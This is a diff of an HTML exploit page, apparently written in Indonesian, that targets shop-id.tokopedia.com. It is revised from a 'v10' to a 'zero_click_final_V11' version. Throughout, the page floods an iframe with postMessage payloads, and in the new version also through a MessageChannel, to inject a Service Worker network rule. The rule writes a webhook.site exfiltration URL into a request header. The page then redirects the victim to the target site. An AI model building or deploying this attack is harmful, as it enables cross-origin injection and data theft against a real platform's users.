@@ -2,22 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Security Verification</title>
+    <title>Security Audit Framework</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .box { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; }
-        .loading { font-size: 24px; margin-bottom: 10px; }
-        #progress { width: 300px; background: #333; height: 20px; margin: 20px auto; position: relative; }
-        #bar { width: 0%; height: 100%; background: #0f0; transition: width 0.2s; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .console { border: 1px solid #00ff00; display: inline-block; padding: 40px; background: #000; box-shadow: 0 0 15px #00ff00; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="loading" id="status">[ INITIALIZING ATTACK ]</div>
-        <div id="progress"><div id="bar"></div></div>
-        <p id="sub-status">Targeting: shop-id.tokopedia.com</p>
+    <div class="console">
+        <h1 id="status">[ INITIALIZING ]</h1>
+        <p id="sub-status" class="blink">Preparing bypass sequence...</p>
+        <div id="log" style="font-size: 12px; color: #888; margin-top: 20px;"></div>
     </div>
 
     <iframe id="pwn_gate" 
@@ -28,67 +26,72 @@
         const gate = document.getElementById('pwn_gate');
         const statusH1 = document.getElementById('status');
         const statusP = document.getElementById('sub-status');
-        const bar = document.getElementById('bar');
-        
-        // --- KONFIGURASI ---
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID LU
-        const targetURL = "https://shop-id.tokopedia.com/";
+        const logDiv = document.getElementById('log');
 
-        // Payload untuk meracuni Service Worker
+        // --- KONFIGURASI WEBHOOK LU ---
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
+        const targetSite = "https://shop-id.tokopedia.com/";
+
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "exploit_final_v10",
+                ruleName: "zero_click_final_V11",
                 global: true,
-                conditions: [],
                 handlers: [{
                     handler: "replace",
                     type: "header",
                     field: "X-Pns-Referrer",
-                    // Mengirimkan tanda eksfiltrasi ke webhook
-                    value: webhook + "?origin=tokopedia_pwned&ts=" + Date.now()
+                    value: webhook + "?data=pwned_" + Date.now()
                 }]
             }]
         };
 
-        let progress = 0;
+        function addLog(msg) {
+            logDiv.innerHTML += "> " + msg + "<br>";
+        }
 
         gate.onload = function() {
-            statusH1.innerText = "[ INJECTING PAYLOAD ]";
-            statusP.innerText = "Bypassing Same-Origin Policy...";
+            statusH1.innerText = "[ EXPLOITING ]";
+            statusP.innerText = "Bypassing Origin Validation...";
+            addLog("Gate Loaded: 200 OK");
 
-            // 1. Wake up call untuk Service Worker
-            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
+            // TEKNIK: MessageChannel Handshake
+            // Ini untuk memaksa Service Worker membuka jalur komunikasi
+            const channel = new MessageChannel();
+            
+            addLog("Establishing MessageChannel...");
+            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*", [channel.port2]);
 
-            // 2. Heavy injection loop
-            let count = 0;
-            const bomb = setInterval(() => {
-                try {
-                    // Kirim ke semua origin (*) dan origin spesifik untuk memastikan masuk
-                    gate.contentWindow.postMessage(payload, "*");
-                    gate.contentWindow.postMessage(payload, "https://mon.tiktokv.com");
-                } catch(e) {}
-
-                count++;
-                progress = (count / 50) * 100;
-                bar.style.width = progress + "%";
-
-                if (count >= 50) {
-                    clearInterval(bomb);
-                    statusH1.innerText = "[ SYNCING CACHE ]";
-                    statusP.innerText = "Waiting for persistence (7s)...";
-                    
-                    // 3. Beri waktu Service Worker menulis ke Cache Storage
-                    setTimeout(() => {
-                        statusH1.innerText = "[ REDIRECTING ]";
-                        statusP.innerText = "Triggering poisoned worker on target...";
+            setTimeout(() => {
+                addLog("Firing Cross-Origin Payload...");
+                
+                let count = 0;
+                const bomb = setInterval(() => {
+                    try {
+                        // Tembak via postMessage Standar
+                        gate.contentWindow.postMessage(payload, "*");
                         
-                        // 4. Pindah ke target untuk mengeksekusi rule yang sudah terinjeksi
-                        location.href = targetURL;
-                    }, 7000);
-                }
-            }, 100);
+                        // Tembak via MessageChannel Port
+                        channel.port1.postMessage(payload);
+                    } catch(e) {}
+
+                    count++;
+                    if (count >= 60) {
+                        clearInterval(bomb);
+                        statusH1.innerText = "[ PERSISTING ]";
+                        statusP.innerText = "Syncing with Cache Storage (10s)...";
+                        addLog("Injection complete. Waiting for sync...");
+                        
+                        // Jeda agar Service Worker selesai menulis ke Cache
+                        setTimeout(() => {
+                            statusH1.innerText = "[ EXECUTING ]";
+                            addLog("Redirecting to target...");
+                            location.href = targetSite;
+                        }, 10000);
+                    }
+                }, 100);
+            }, 1000);
         };
     </script>
 </body>
